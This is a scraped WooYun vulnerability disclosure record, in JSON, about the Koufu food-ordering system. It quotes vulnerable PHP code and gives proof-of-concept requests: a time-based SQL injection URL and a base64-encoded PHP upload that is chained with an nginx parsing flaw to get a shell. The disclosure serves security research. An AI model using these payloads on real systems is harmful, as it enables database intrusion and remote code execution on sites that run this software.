{"id": 53485, "wybug_id": "wooyun-2014-067531", "wybug_title": "口福订餐系统SQL注入+鸡肋getshell", "wybug_corp": "koufukeji.com", "wybug_author": "magerx", "wybug_date": "2014-07-07 16:59", "wybug_open_date": "2014-10-02 17:00", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-12：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向公众公开  简要描述： sql注入 详细说明：  sql注入：/source/index/activity_topic.ctrl.php,152行\npublic function onAdd(){\t\t\t$id=get_post(\"id\",\"i\");\t\t\t$act_id=get_post('act_id');\t\t\tif($id){\t\t\t\t$data=$this->activity_topic->selectRow(array(\"where\"=>\"id={$id}\"));\t\t\t\t$data['content']=$this->activity_topic_data->selectOne(array(\"where\"=>\"id={$id}\",\"fields\"=>\"content\"));\t\t\t\t$act_id=$data['act_id'];\t\t\t\tif($data['userid']!=$this->userid){\t\t\t\t\t$this->activityapiControl->checkRole($act_id,2);\t\t\t\t}else{\t\t\t\t\t$this->activityapiControl->checkRole($act_id);\t\t\t\t}\t\t\t}\t\t\t$activity=$this->activity->selectRow(array(\"where\"=>\" id=\".$act_id));\t\t\t\t\t\t$this->smarty->assign(array(\t\t\t\t\"data\"=>$data,\t\t\t\t\"activity\"=>$activity\t\t\t));\t\t\t$this->smarty->display(\"activity_topic/add.html\");\t\t}\n$act_id没有经过过滤直接post之后拼接到sql语句中，同时没有引号括起，所以无需闭合。\nhttp://localhost/koufu/index.php?m=activity_topic&a=Add&act_id=12 and sleep(2)%23\n\n\n2、配合nginx解析漏洞getshell/source/index/upload.ctrl.php,91行：\npublic function onBase64(){\t\t$dir=isset($_GET['dir'])?get('dir','h').\"/\":\"\";\t\tif(get('id','i')){\t\t\t$dir=\"attach/\".$dir.$this->dirId(get('id','i'));\t\t}else{\t\t\t$dir=\"attach/\".$dir.date(\"Y/m/d/\").$this->dirId(get('id','i'));\t\t}\t\tumkdir($dir);\t\t$file=$dir.$this->login->userid.microtime(true).\".jpg\";\t\tfile_put_contents($file,base64_decode($_POST['content']));\t\t$this->loadClass(\"image\",false,false);\t\t$img=new image();\t\t$imgurl=$file;\t\t$img->makethumb($imgurl.\".100x100.jpg\",$imgurl,\"100\",\"100\",1);\t\t$img->makethumb($imgurl.\".small.jpg\",$imgurl,\"240\");\t\t$img->makethumb($imgurl.\".middle.jpg\",$imgurl,\"440\");\t\t$data=array(\"error\"=>0,\"imgurl\"=>$file,\"msg\"=>\"\");\t\techo json_encode($data);\t}\n$dir可以自定义，直接将$content的内容bese64解码后写到了$file中，$file我们可以计算，也可以通过报错查看，鸡肋的地方是我们只能控制写入的内容，和目录名称，无法修改后缀，所以只好配合nginx解析漏洞拿shell\nhttp://localhost/koufu/index.php?m=upload&a=base64&dir=test4&id=100\npost:\ncontent=PD9waHAgcGhwaW5mbygpOz8+\n\n\n   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 magerx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-02 17:00 厂商回复：  最新状态： 2014-07-12：谢谢反馈！努力修补！  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}